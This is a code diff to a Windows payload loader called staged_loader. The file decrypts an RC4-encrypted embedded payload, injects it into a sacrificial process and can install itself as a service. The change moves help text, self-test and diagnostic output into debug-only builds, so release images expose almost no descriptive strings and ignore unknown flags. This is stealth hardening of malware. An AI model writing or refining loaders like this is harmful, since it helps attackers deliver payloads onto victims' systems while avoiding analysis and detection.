@@ -90,6 +90,7 @@ static HANDLE g_child = NULL;      /* sacrificial process (kill on stop)    */
  * descriptive text at all. Build with -DDEBUG (build.sh --debug) for
  * verbose diagnostics.
  */
+#ifdef DEBUG
 /* emit_wide converts a wide string to UTF-8 bytes and writes it to f. The
  * wide stdio functions (wprintf/vfwprintf) are unreliable under the mingw-w64
  * CRT when output is redirected (they truncate after one character), so all
@@ -102,6 +103,7 @@ static void emit_wide(const wchar_t *s, FILE *f) {
     fputs(mb, f);
   }
 }
+#endif /* DEBUG */
 
 #ifdef DEBUG
 static void log_msg(const wchar_t *fmt, ...) {
@@ -120,7 +122,9 @@ static void log_msg(const wchar_t *fmt, ...) {
 #define LOG(...) ((void)0)
 #endif
 
-/* wprint formats a wide message and prints it to stdout (byte-oriented). */
+/* wprint formats a wide message and prints it to stdout (byte-oriented).
+ * Diagnostics are compiled out of release images, like LOG(). */
+#ifdef DEBUG
 static void wprint(const wchar_t *fmt, ...) {
   wchar_t tmp[2048];
   va_list ap;
@@ -130,6 +134,7 @@ static void wprint(const wchar_t *fmt, ...) {
   va_end(ap);
   emit_wide(tmp, stdout);
 }
+#endif /* DEBUG */
 
 /*
  * The stager hands us the RC4-encrypted blob and key it unpacked into
@@ -156,7 +161,8 @@ static int decrypt_payload(unsigned char **payload, size_t *payload_len) {
   return 0;
 }
 
-/* hex_byte prints one byte as lowercase hex. */
+/* hex_byte prints one byte as lowercase hex (diagnostics only). */
+#ifdef DEBUG
 static void hex_byte(FILE *f, uint8_t b) {
   static const char hex[] = "0123456789abcdef";
   fputc(hex[b >> 4], f);
@@ -170,6 +176,7 @@ static void print_hex(FILE *f, const unsigned char *buf, size_t n) {
     hex_byte(f, buf[i]);
   }
 }
+#endif /* DEBUG */
 
 /* ----------------------------------------------------------------- trampoline
  */
@@ -584,6 +591,8 @@ static DWORD do_inject(const unsigned char *payload, size_t payload_len) {
 
 /* ----------------------------------------------------------------- selftest */
 
+#ifdef DEBUG
+
 /*
  * selftest decrypts the embedded payload and prints a single machine-parseable
  * line so CI (and operators) can verify the resource/RC4 pipeline end to end
@@ -671,6 +680,8 @@ static int selftest(void) {
   free(payload);
   return 0;
 }
+
+#endif /* DEBUG */
 
 /* run_once performs a single foreground injection with the embedded blob. */
 static int run_once(void) {
@@ -801,7 +812,9 @@ static int service_install(void) {
     goto out;
   }
   LOG(L"service '%s' installed (%s)", g_service_name, image);
+#ifdef DEBUG
   wprint(L"start it with: sc start %s\n", g_service_name);
+#endif
   ret = 0;
 
 out:
@@ -907,8 +920,8 @@ out:
 #endif /* STAGED_LOADER_NO_SERVICE */
 
 static void print_usage(void) {
-#ifndef STAGED_LOADER_NO_SERVICE
 #ifdef DEBUG
+#ifndef STAGED_LOADER_NO_SERVICE
   /* Long-form help for debug/lab builds only. */
   wprint(L"staged_loader (service: %s)\n"
          L"\n"
@@ -926,14 +939,10 @@ static void print_usage(void) {
          g_service_name, SACRIFICIAL_PROCESS, g_service_name, g_service_name,
          g_service_name, g_service_name);
 #else
-  /* Production images only advertise a terse, generic command list. */
-  wprint(L"usage: %s [--install] [--uninstall] [--start] [--stop] [--run] "
-         L"[--selftest]\n",
-         g_service_name);
+  wprint(L"usage: %s [--run] [--selftest]\n", g_service_name);
 #endif
 #else
-  /* Non-service hosts only expose the foreground commands. */
-  wprint(L"usage: %s [--run] [--selftest]\n", g_service_name);
+  (void)0; /* release images carry no help text */
 #endif
 }
 
@@ -1015,9 +1024,11 @@ StageMain(int argc, wchar_t **argv, const unsigned char *enc_payload,
       return service_start_stop(0);
     }
 #endif
+#ifdef DEBUG
     if (wcscmp(argv[i], L"--selftest") == 0) {
       return selftest();
     }
+#endif
     if (wcscmp(argv[i], L"--run") == 0) {
       return run_once();
     }
@@ -1031,8 +1042,12 @@ StageMain(int argc, wchar_t **argv, const unsigned char *enc_payload,
   print_usage();
   return 0;
 #else
-  /* Non-service host: no command means a single foreground injection. */
-  return run_once();
+  /* Non-service host: a bare invocation performs one injection. Unrecognised
+   * flags (such as a release build's stripped --selftest) do nothing. */
+  if (argc <= 1) {
+    return run_once();
+  }
+  return 0;
 #endif
 }
 
